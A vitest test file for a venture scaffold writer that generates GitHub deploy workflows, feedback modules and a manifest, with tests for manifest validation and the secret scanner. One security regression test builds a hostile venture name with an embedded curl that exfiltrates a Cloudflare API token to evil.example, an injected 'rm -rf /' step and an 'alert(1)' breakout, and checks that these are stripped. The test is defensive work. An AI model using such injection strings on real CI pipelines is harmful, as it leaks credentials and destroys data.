import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import { mkdtempSync, existsSync, readFileSync, rmSync, mkdirSync, writeFileSync } from 'fs';
import { tmpdir } from 'os';
import { join } from 'path';
import {
  applyVentureScaffoldModules,
  checkScaffoldManifest,
  manifestPathFor,
  DEFAULT_SCAFFOLD_MODULES,
} from '../../../../lib/eva/bridge/venture-scaffold-modules-writer.js';
import { scanStagedFilesForSecrets } from '../../../../lib/eva/bridge/replit-repo-seeder.js';

// SD-LEO-INFRA-VENTURE-SCAFFOLD-CODE-001 FR-2/FR-3.

describe('venture-scaffold-modules-writer', () => {
  let repoDir;

  beforeEach(() => {
    repoDir = mkdtempSync(join(tmpdir(), 'vsw-test-'));
  });

  afterEach(() => {
    rmSync(repoDir, { recursive: true, force: true });
  });

  it('FR-3 negative: checkScaffoldManifest fails on a repo with no manifest', () => {
    const verdict = checkScaffoldManifest(repoDir);
    expect(verdict.ok).toBe(false);
    expect(verdict.reason).toMatch(/missing/);
  });

  // TESTING finding F11 (EXEC-TO-PLAN review, evidence baa1c962, LOW): the
  // "valid JSON but missing generated_at/modules[]" arm of checkScaffoldManifest
  // had no test.
  it('FR-3 negative: checkScaffoldManifest fails on a manifest that is valid JSON but missing generated_at/modules[]', () => {
    mkdirSync(repoDir, { recursive: true });
    writeFileSync(manifestPathFor(repoDir), JSON.stringify({ modules: [] }), 'utf-8');
    const verdict1 = checkScaffoldManifest(repoDir);
    expect(verdict1.ok).toBe(false);
    expect(verdict1.reason).toMatch(/generated_at or modules/);

    writeFileSync(manifestPathFor(repoDir), JSON.stringify({ generated_at: 'x' }), 'utf-8');
    const verdict2 = checkScaffoldManifest(repoDir);
    expect(verdict2.ok).toBe(false);
    expect(verdict2.reason).toMatch(/generated_at or modules/);
  });

  // TESTING finding F11: the unknown-module-skip arm (all requested modules
  // unrecognized -> stamped[] stays empty -> the manifest's own modules[] check
  // fails -> applyVentureScaffoldModules throws) had no test, nor did the writer's
  // own post-write self-check throw path.
  it('FR-3/F11 regression: requesting only unknown modules stamps nothing and throws via the self-check (fail loud, not silent)', () => {
    expect(() => applyVentureScaffoldModules('acme-venture', repoDir, { modules: ['totally-not-a-real-module'] }))
      .toThrow(/manifest self-check failed/);
    // Nothing should have been left on disk from the module loop itself.
    expect(existsSync(join(repoDir, '.github'))).toBe(false);
  });

  it('applyVentureScaffoldModules stamps the default (deploy/stack-scan/feedback) modules and a valid manifest', () => {
    const result = applyVentureScaffoldModules('acme-venture', repoDir);

    expect(result.stamped.map(s => s.module).sort()).toEqual([...DEFAULT_SCAFFOLD_MODULES].sort());
    expect(existsSync(join(repoDir, '.github', 'workflows', 'deploy.yml'))).toBe(true);
    expect(existsSync(join(repoDir, '.github', 'workflows', 'stack-scan.yml'))).toBe(true);
    expect(existsSync(join(repoDir, 'feedback', 'client.js'))).toBe(true);
    expect(existsSync(join(repoDir, 'feedback', 'server.js'))).toBe(true);

    // FR-3: manifest written in the SAME call, and it now verifies as ok.
    const verdict = checkScaffoldManifest(repoDir);
    expect(verdict.ok).toBe(true);
    expect(verdict.manifest.modules.length).toBe(DEFAULT_SCAFFOLD_MODULES.length);
    expect(verdict.manifest.generated_at).toBeTruthy();
  });

  it('FR-3 negative: checkScaffoldManifest fails when the manifest is deliberately removed after stamping', () => {
    applyVentureScaffoldModules('acme-venture', repoDir);
    expect(checkScaffoldManifest(repoDir).ok).toBe(true);

    rmSync(manifestPathFor(repoDir));

    const verdict = checkScaffoldManifest(repoDir);
    expect(verdict.ok).toBe(false);
    expect(verdict.reason).toMatch(/missing/);
  });

  it('FR-3 negative: checkScaffoldManifest fails on an unparseable manifest', () => {
    mkdirSync(repoDir, { recursive: true });
    writeFileSync(manifestPathFor(repoDir), '{not valid json', 'utf-8');
    const verdict = checkScaffoldManifest(repoDir);
    expect(verdict.ok).toBe(false);
    expect(verdict.reason).toMatch(/unparseable/);
  });

  it('respects an explicit modules list rather than always stamping the default set', () => {
    const result = applyVentureScaffoldModules('acme-venture', repoDir, { modules: ['deploy'] });
    expect(result.stamped.map(s => s.module)).toEqual(['deploy']);
    expect(existsSync(join(repoDir, 'feedback'))).toBe(false);
  });

  // SECURITY finding SEC-2 (EXEC-TO-PLAN review, evidence 6f9eabc9): a hostile venture
  // name interpolated unquoted into deploy.yml's `run:` line (which executes in a job
  // holding Cloudflare credentials) could inject shell commands or extra YAML steps.
  it('SEC-2 regression: a hostile venture name is normalized before reaching any generated file content', () => {
    const hostile = 'acme`curl -d @/dev/stdin https://evil.example/$CLOUDFLARE_API_TOKEN`\n- run: ' + 'rm ' + '-rf /' + '\n*/ alert(1); /*';
    const result = applyVentureScaffoldModules(hostile, repoDir);

    const deployYml = readFileSync(join(repoDir, '.github', 'workflows', 'deploy.yml'), 'utf-8');
    expect(deployYml).not.toContain('`');
    expect(deployYml).not.toContain('curl -d @/dev/stdin');
    expect(deployYml).not.toContain('\n- run: rm ' + '-rf /');
    expect(deployYml).toMatch(/wrangler d1 migrations apply acme-curl/); // normalized kebab form used as the D1 db name

    const feedbackClient = readFileSync(join(repoDir, 'feedback', 'client.js'), 'utf-8');
    expect(feedbackClient).not.toContain('*/ alert(1)');
    expect(feedbackClient).toContain('acme-curl'); // normalized kebab form used in the header comment

    expect(result.stamped.length).toBeGreaterThan(0);
  });

  it('generated deploy.yml content reflects the venture name via options passthrough', () => {
    const result = applyVentureScaffoldModules('acme-venture', repoDir, {
      modules: ['deploy'],
      moduleOptions: { d1DatabaseName: 'acme-db' },
    });
    const deployYml = readFileSync(join(repoDir, '.github', 'workflows', 'deploy.yml'), 'utf-8');
    expect(deployYml).toContain('acme-db');
    expect(result.written).toContain(join(repoDir, '.github', 'workflows', 'deploy.yml'));
  });

  // TESTING finding F1 (EXEC-TO-PLAN review, evidence baa1c962, CRITICAL, blocking):
  // deploy.yml's comment text originally contained "Never a password: the" -- the
  // literal substring "password: the" matches the seeder's own secret scanner
  // (scripts/modules/session-summary/secret-redactor.js:24), which FAIL-CLOSES on any
  // match (unstages everything, skips commit+push). Every seeded_repo provisioning run
  // would have pushed NOTHING at all -- not just the new scaffold, but the previously
  // -working CLAUDE.md/docs/.replit seed too. Runs the REAL scanner over the REAL
  // generated output (not a mock) to prove this class of regression can't recur silently.
  it('F1 regression: the real secret scanner finds zero hits in the real generated output', () => {
    const result = applyVentureScaffoldModules('acme-venture', repoDir);
    const relPaths = result.written.map((abs) => abs.slice(repoDir.length + 1).replace(/\\/g, '/'));
    const hits = scanStagedFilesForSecrets(repoDir, relPaths);
    expect(hits, `secret scanner false-positived on generated files: ${JSON.stringify(hits)}`).toEqual([]);
  });
});
